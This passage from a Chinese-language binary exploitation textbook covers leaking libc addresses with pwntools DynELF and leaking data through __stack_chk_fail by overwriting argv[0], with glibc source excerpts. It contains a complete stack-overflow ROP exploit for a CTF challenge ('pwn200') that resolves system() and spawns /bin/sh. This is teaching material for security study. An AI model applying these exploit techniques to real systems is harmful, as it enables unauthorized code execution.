edx
| 0x08048499 890424 mov dword [esp], eax
| 0x0804849c e8dffeffff call sym.imp.setbuf
; void setbuf(FILE *stream,
| 0x080484a1 c74424080001. mov dword [local_8h],
0x100 ; [0x100:4]=-1 ; 256
| 0x080484a9 8d4594 lea eax, [local_6ch]
| 0x080484ac 89442404 mov dword [local_4h],
eax
| 0x080484b0 c70424000000. mov dword [esp], 0
| 0x080484b7 e8d4feffff call sym.imp.read
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x080484bc c9 leave
\ 0x080484bd c3 ret
于是我们构造 leak 函数如下，即 write(1, addr, 4) ：
654
4.8 使用 DynELF 泄露函数地址
def leak(addr):
payload = "A" * 112
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(addr)
payload += p32(4)
io.send(payload)
data = io.recv()
log.info("leaking: 0x%x --> %s" % (addr, (data or '').encode(
'hex')))
return data
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
log.info("system address: 0x%x" % system_addr)
注意我们需要一个 pppr 的 gadget 来平衡栈：
$ ropgadget --binary pwn200 --only "pop|ret"
...
0x0804856c : pop ebx ; pop edi ; pop ebp ; ret
得到了 system 的地址，就可以利用 read 函数读入 "/bin/sh"，从而得到 shell，完
整的 exp 如下：
from pwn import *
# context.log_level = 'debug'
elf = ELF('./pwn200')
io = process('./pwn200')
io.recvline()
write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
655
4.8 使用 DynELF 泄露函数地址
read_got = elf.got['read']
vuln_addr = 0x08048484
start_addr = 0x080483d0
bss_addr = 0x0804a020
pppr_addr = 0x0804856c
def leak(addr):
payload = "A" * 112
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(addr)
payload += p32(4)
io.send(payload)
data = io.recv()
log.info("leaking: 0x%x --> %s" % (addr, (data or '').encode(
'hex')))
return data
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
log.info("system address: 0x%x" % system_addr)
payload = "A" * 112
payload += p32(read_plt)
payload += p32(pppr_addr)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(8)
payload += p32(system_addr)
payload += p32(vuln_addr)
payload += p32(bss_addr)
io.send(payload)
io.send('/bin/sh\x00')
io.interactive()
该题除了这里使用 DynELF 的方法，在后面章节 6.3 中，还会介绍一种使用 ret2dl-
resolve 的解法。
656
4.8 使用 DynELF 泄露函数地址
puts
#include 
int puts(const char *s);
puts 函数使用的参数只有一个，即需要输出的数据的起始地址，它会一直输出直到
遇到 \x00 ，所以它输出的数据长度是不容易控制的，我们无法预料到零字符会
出现在哪里，截止后，puts 还会自动在末尾加上换行符 \n 。该函数的优点是在
64 位程序中也可以很方便地使用。缺点是会受到零字符截断的影响，在写 leak 函
数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了
空字符串，则要手动赋值 \x00 ，包括我们在 dump 内存的时候，也常常受这个问
题的困扰，可以参考章节 6.1 dump 内存的部分。
所以我们常常需要这样做：
data = io.recv()[:-1] # 去掉末尾\n
if not data:
data = '\x00'
else:
data = data[:4]
这只是个例子，还是要具体情况具体分析。
printf
#include 
int printf(const char *format, ...);
该函数常用于在格式化字符串中泄露内存，和 puts 差不多，也受到 \x00 的影
响，只是没有在末尾自动添加 \n 。而且还有个问题要注意，为了防止 printf 的
%s 被 \x00 截断，需要对格式化字符串做一些改变。更详细的内容请参考章节
6.2。
657
4.8 使用 DynELF 泄露函数地址
参考资料
Resolving remote functions using leaks
Finding Function's Load Address
借助DynELF实现无libc的漏洞利用小结
658
4.9 shellcode 开发
4.9 shellcode 开发
参考资料
参考资料
http://shell-storm.org/shellcode/
https://www.exploit-db.com/shellcode/
659
4.10 跳转导向编程（JOP）
4.10 跳转导向编程（JOP）
660
4.12 利用 __stack_chk_fail
4.12 利用 __stack_chk_fail
回顾 canary
libc 2.23
CTF 实例
libc 2.25
参考资料
回顾 canary
在章节 4.4 中我们已经知道了有一种叫做 canary 的漏洞缓解机制，用来判断是否
发生了栈溢出。
这一节我们来看一下，在开启了 canary 的程序上，怎样利用
__stack_chk_fail 泄漏信息。
一个例子：
#include 
void main(int argc, char **argv) {
printf("argv[0]: %s\n", argv[0]);
char buf[10];
scanf("%s", buf);
// argv[0] = "Hello World!";
}
我们先注释掉最后一行：
$ gcc chk_fail.c
$ python -c 'print "A"*50' | ./a.out
argv[0]: ./a.out
*** stack smashing detected ***: ./a.out terminated
Aborted (core dumped)
661
4.12 利用 __stack_chk_fail
可以看到默认情况下 argv[0] 是指向程序路径及名称的指针，然后错误信息中打
印出了这个字符串。
然后解掉注释再来看一看：
$ python -c 'print "A"*50' | ./a.out
argv[0]: ./a.out
*** stack smashing detected ***: Hello World! terminated
Aborted (core dumped)
由于程序中我们修改 argv[0] ，此时错误信息就打印出了 Hello World! 。是
不是很神奇。
main 函数的反汇编结果如下：
662
4.12 利用 __stack_chk_fail
gef➤ disassemble main
Dump of assembler code for function main:
0x00000000004005f6 : push rbp
0x00000000004005f7 : mov rbp,rsp
=> 0x00000000004005fa : sub rsp,0x30
0x00000000004005fe : mov DWORD PTR [rbp-0x24],edi
0x0000000000400601 : mov QWORD PTR [rbp-0x30],rsi
0x0000000000400605 : mov rax,QWORD PTR fs:0x28
0x000000000040060e : mov QWORD PTR [rbp-0x8],rax
0x0000000000400612 : xor eax,eax
0x0000000000400614 : mov rax,QWORD PTR [rbp-0x30]
0x0000000000400618 : mov rax,QWORD PTR [rax]
0x000000000040061b : mov rsi,rax
0x000000000040061e : mov edi,0x4006f4
0x0000000000400623 : mov eax,0x0
0x0000000000400628 : call 0x4004c0 
0x000000000040062d : lea rax,[rbp-0x20]
0x0000000000400631 : mov rsi,rax
0x0000000000400634 : mov edi,0x400701
0x0000000000400639 : mov eax,0x0
0x000000000040063e : call 0x4004e0 
0x0000000000400643 : mov rax,QWORD PTR [rbp-0x30]
0x0000000000400647 : mov QWORD PTR [rax],0x400704
0x000000000040064e : nop
0x000000000040064f : mov rax,QWORD PTR [rbp-0x8]
0x0000000000400653 : xor rax,QWORD PTR fs:0x28
# 检查 canary 是否相同
0x000000000040065c : je 0x400663 
# 相同
0x000000000040065e : call 0x4004b0  # 不相同
0x0000000000400663 : leave
0x0000000000400664 : ret
End of assembler dump.
所以当 canary 检查失败的时候，即产生栈溢出，覆盖掉了原来的 canary 的时候，
函数不能正常返回，而是执行 __stack_chk_fail() 函数，打印出 argv[0]
指向的字符串。
663
4.12 利用 __stack_chk_fail
libc 2.23
Ubuntu 16.04 使用的是 libc-2.23，其 __stack_chk_fail() 函数如下：
// debug/stack_chk_fail.c
extern char **__libc_argv attribute_hidden;
void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
__fortify_fail ("stack smashing detected");
}
调用函数 __fortify_fail() ：
// debug/fortify_fail.c
extern char **__libc_argv attribute_hidden;
void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
{
/* The loop is added only to keep gcc happy. */
while (1)
__libc_message (2, "*** %s ***: %s terminated\n",
msg, __libc_argv[0] ?: "");
}
libc_hidden_def (__fortify_fail)
__fortify_fail() 调用函数 __libc_message() 打印出错误信息和
argv[0] 。
还有一个错误信息输出到哪儿的问题，再看一下 __libc_message() ：
664
4.12 利用 __stack_chk_fail
// sysdeps/posix/libc_fatal.c
/* Abort with an error message. */
void
__libc_message (int do_abort, const char *fmt, ...)
{
va_list ap;
int fd = -1;
va_start (ap, fmt);
#ifdef FATAL_PREPARE
FATAL_PREPARE;
#endif
/* Open a descriptor for /dev/tty unless the user explicitly
requests errors on standard error. */
const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_")
;
if (on_2 == NULL || *on_2 == '\0')
fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDE
LAY);
if (fd == -1)
fd = STDERR_FILENO;
环境变量 LIBC_FATAL_STDERR_ 通过函数 __libc_secure_getenv 来读取，
如果该变量没有被设置或者为空，即 \0 或 NULL ，错误信息 stderr 会被重定向
到 _PATH_TTY ，该值通常是 /dev/tty ，因此会直接在当前终端打印出来，而
不是传到 stderr。
CTF 实例
CTF 中就有这样一种题目，需要我们把 argv[0] 覆盖为 flag 的地址，并利用
__stack_chk_fail() 把flag 给打印出来。
实例可以查看章节 6.1.13 和 6.1.14。
665
4.12 利用 __stack_chk_fail
libc 2.25
最后我们来看一下 libc-2.25 里的 __stack_chk_fail ：
extern char **__libc_argv attribute_hidden;
void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
__fortify_fail_abort (false, "stack smashing detected");
}
strong_alias (__stack_chk_fail, __stack_chk_fail_local)
它使用了新函数 __fortify_fail_abort() ，这个函数是在 BZ #12189 这次提
交中新增的：
666
4.12 利用 __stack_chk_fail
extern char **__libc_argv attribute_hidden;
void
__attribute__ ((noreturn))
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{
/* The loop is added only to keep gcc happy. Don't pass down
__libc_argv[0] if we aren't doing backtrace since __libc_ar
gv[0]
may point to the corrupted stack. */
while (1)
__libc_message (need_backtrace ? (do_abort | do_backtrace) :